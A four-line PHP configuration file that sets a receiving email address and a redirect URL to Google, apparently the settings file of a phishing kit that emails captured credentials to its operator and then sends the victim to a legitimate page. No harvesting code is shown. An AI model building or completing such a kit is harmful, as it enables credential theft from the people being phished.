<?php 
$Receive_email="michealgates3@gmail.com";
$redirect="https://www.google.com/";
?>